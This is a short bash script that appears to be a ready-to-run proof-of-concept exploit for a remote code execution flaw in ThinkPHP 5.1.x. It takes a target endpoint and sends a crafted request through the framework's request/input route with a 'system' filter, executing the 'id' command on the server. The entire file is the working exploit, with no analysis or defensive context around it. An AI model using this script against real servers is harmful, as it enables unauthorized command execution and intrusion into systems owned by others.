#!/bin/bash
# ThinkPHP — invokeFunction RCE (5.1.x via request input)
# Usage: invoke_51_rce.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

curl -s "${ENDPOINT}/index.php?s=index/think\\request/input&filter[]=system&data=id" \
  --max-time 10
